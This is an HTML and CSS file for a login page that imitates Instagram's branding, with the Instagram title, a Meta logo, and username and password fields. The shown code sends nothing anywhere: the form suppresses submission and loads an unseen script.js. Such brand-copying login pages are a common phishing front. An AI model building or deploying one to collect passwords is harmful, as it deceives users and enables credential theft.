<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login â€¢ Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    
    :root{
      --bg1:#0d253a; /* deep teal/navy */
      --bg2:#091a2a; /* darker */
      --card:#12283b;
      --card-2:#0f2232;
      --text:#d6e2f0;
      --muted:#93a7bd;
      --field:#12283b;
      --field-border:#2a3f56;
      --btn:#1877f2; /* Meta blue */
      --btn-pressed:#0f66d8;
      --accent:#3897f0;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
      color:var(--text);
      background: radial-gradient(1200px 900px at 80% -20%, #173a52 0%, transparent 45%),
                  radial-gradient(1000px 700px at -10% 0%, #1b3f57 0%, transparent 50%),
                  linear-gradient(180deg, var(--bg1), var(--bg2));
      display:flex; align-items:center; justify-content:center;
    }
    .wrap{ width:min(560px, 100%); }
    .content{ padding: 24px 18px 16px; }
    .lang{ text-align:center; color:var(--muted); font-size:14px; margin-bottom:28px; }

    .logo{ display:flex; align-items:center; justify-content:center; margin: 16px 0 24px; }
    .card{ width:100%; max-width: 560px; margin-inline:auto; }

    .form{ display:flex; flex-direction:column; gap:14px; }
    .input{
      width:100%;
      background: linear-gradient(180deg, var(--field), var(--card-2));
      border:1px solid var(--field-border);
      color:var(--text);
      border-radius:18px;
      padding:18px 16px;
      font-size:16px; outline:none;
      transition: border .15s ease, box-shadow .15s ease;
    }
    .input::placeholder{ color:#8aa0b5; }
    .input:focus{ border-color:#3a5773; box-shadow:0 0 0 3px rgba(56,151,240,.15); }

    .btn{
      width:100%;
      border:none; cursor:pointer;
      background:var(--btn);
      color:white; font-weight:600;
      border-radius:999px; /* pill */
      padding:16px 18px; font-size:18px;
      margin-top:8px;
      box-shadow: 0 8px 16px rgba(24,119,242,.25);
      transition: transform .06s ease, filter .15s ease, background .15s ease;
    }
    .btn:active{ transform: translateY(1px); background:var(--btn-pressed); }

    .forgot{ display:block; text-align:center; margin:16px 0 20px; color:#b1c2d4; text-decoration:none; font-weight:500; }
    .forgot:hover{ text-decoration:underline; }

    .cta-bar{ position:fixed; left:0; right:0; bottom:24px; padding:0 18px; }
    .cta{ width: min(560px, 100%); margin: 0 auto; border:1px solid var(--field-border); background:rgba(13,25,38,.65); backdrop-filter: blur(6px); border-radius:18px; padding:16px; display:flex; align-items:center; justify-content:center; gap:10px; }
    .cta a{ color:white; font-weight:600; text-decoration:none; }

    .meta{ display:flex; align-items:center; justify-content:center; gap:10px; margin-top:14px; color:#c7d4e2; }
    .meta span{ font-weight:600; letter-spacing:.2px; }

    /* Make it feel like the screenshot on very tall screens */
    @media (min-height: 820px){
      .content{ padding-top: 48px; }
    }

  </style>
</head>
<body>
  <main class="wrap">
    <div class="content">
      <div class="lang">English (US)</div>

      <!-- Instagram glyph with authentic gradient -->
      <div class="logo" aria-label="Instagram">
        <img src="insta.png" alt="image" width="70" height="70" >
      </div>

      <form class="form" autocomplete="off" onsubmit="event.preventDefault()">
        <input class="input" type="text" name="username" placeholder="Username, email or mobile number" aria-label="Username, email or mobile number" />
        <input class="input" type="password" name="password" placeholder="Password" aria-label="Password" />
        <button class="btn" type="submit">Log in</button>
      </form>

      <a class="forgot" href="#">Forgot password?</a>
    </div>

    <!-- Bottom CTA & Meta lockup -->
    <div class="cta-bar">
      <div class="cta">
        <a href="#" aria-label="Create new account">Create new account</a>
      </div>
      <div class="meta" aria-label="Meta">
        <svg width="28" height="18" viewBox="0 0 120 72" aria-hidden="true">
          <path d="M7.3 49.9C12.7 34.5 21.7 18 31.6 18c6.8 0 12.2 6.7 18.8 18.4l1.5 2.6 1.5-2.6C60 24.7 65.5 18 72.2 18c9.9 0 18.9 16.5 24.3 31.9 2.2 6.4-1.3 12.1-7.5 12.1-7 0-11.8-6.7-19-21.1l-2.2-4.3-2.2 4.3C58.5 55.3 53.6 62 46.6 62c-6.2 0-9.8-5.7-7.5-12.1z" fill="#c7d4e2"/>
        </svg>
        <span>Meta</span>
      </div>
    </div>
  </main>
  <script src="script.js"></script>
</body>
</html>
